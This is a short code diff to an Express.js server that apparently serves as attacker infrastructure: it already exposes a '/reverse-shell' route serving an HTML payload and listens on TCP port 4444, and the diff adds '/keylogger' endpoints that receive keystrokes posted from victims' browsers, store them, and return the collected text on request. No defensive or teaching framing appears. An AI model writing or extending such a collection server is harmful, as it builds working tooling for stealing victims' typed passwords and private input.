@@ -8,9 +8,21 @@ httpPort = 80,
 tcpPort = 4444
 
 app.use('/files', express.static(__dirname+'/public'))
+app.use(express.json());
 
 app.get('/reverse-shell', (req, res)=>{
   res.send(fs.readFileSync(__dirname + '/html/reverse-shell.html').toString())
+})
+
+var keys = ""
+app.get('/keylogger', (req, res)=>{
+  res.send(keys);
+})
+
+app.post('/keylogger', (req, res)=>{
+  console.log(req.body.data)
+  keys += req.body.data
+  res.end()
 })
 
 server.listen(httpPort, ()=>{
